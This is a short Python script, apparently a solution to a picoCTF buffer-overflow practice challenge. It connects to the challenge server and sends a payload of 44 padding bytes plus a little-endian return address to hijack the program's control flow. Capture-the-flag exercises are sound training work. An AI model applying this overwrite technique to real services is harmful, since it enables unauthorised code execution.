# https://play.picoctf.org/practice/challenge/259

# TODO
import socket
#import sys
#sys.stdout.buffer.write(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08")

with socket.socket() as connection:
    connection.connect(("saturn.picoctf.net", 49871))
    print(connection.recv(1024).decode())
    connection.send(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08\n")
    print(connection.recv(1024).decode())
    print(connection.recv(1024).decode())
